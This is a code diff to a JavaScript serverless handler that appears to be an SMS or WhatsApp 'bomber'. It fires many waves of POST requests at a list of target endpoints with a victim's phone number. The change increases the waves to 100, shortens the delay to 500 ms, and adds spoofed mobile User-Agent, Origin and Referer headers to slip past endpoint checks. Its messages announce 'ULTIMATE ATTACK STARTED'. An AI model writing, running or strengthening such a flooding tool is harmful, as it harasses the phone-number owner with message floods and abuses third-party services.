@@ -11,33 +11,45 @@ export default async function handler(req, res) {
   ];
 
   const runAttack = async () => {
-    const totalWaves = isUltimate ? 10 : amount; // Test er jonno kom rakhi
-    const delay = isUltimate ? 1000 : 3000; 
+    const totalWaves = isUltimate ? 100 : amount; 
+    const delay = isUltimate ? 500 : 2000; 
 
     for (let i = 0; i < totalWaves; i++) {
       const attackPromises = targetLinks.map(async (link) => {
         try {
+          // Amra ekhane ekta "Payload Array" use korchi
+          // Mane ekta variable er bodole onno name try korbo
+          const payload = {
+            number: number,
+            phone: number,
+            target: number,
+            mobile: number,
+            amount: 1,
+            count: 1,
+            country: "BD",
+            service: "whatsapp",
+            msg: "Ultimate Attack",
+            token: "true"
+          };
+
           const response = await fetch(link, {
             method: 'POST',
             headers: { 
               'Content-Type': 'application/json',
-              'Accept': 'application/json',
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
+              'Accept': 'application/json, text/plain, */*',
+              'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
+              'X-Requested-With': 'XMLHttpRequest',
+              'Origin': link,
+              'Referer': link,
             },
-            body: JSON.stringify({
-              number: number,
-              amount: 1,
-              country: "BD",
-              service: "whatsapp",
-              msg: "Test"
-            }),
+            body: JSON.stringify(payload),
           });
 
-          const result = await response.text(); // Error message check korar jonno
-          console.log(`Link: ${link} | Status: ${response.status} | Response: ${result.substring(0, 50)}`);
-          
+          const result = await response.text();
+          console.log(`[Wave ${i}] Link: ${link} | Status: ${response.status}`);
+
         } catch (err) {
-          console.error(`Link: ${link} | Error: ${err.message}`);
+          console.error(`[Wave ${i}] Error: ${err.message}`);
         }
       });
 
@@ -50,6 +62,6 @@ export default async function handler(req, res) {
 
   return res.status(200).json({ 
     success: true, 
-    message: "ATTACK STARTED! Check Console for Debugging" 
+    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
   });
 }
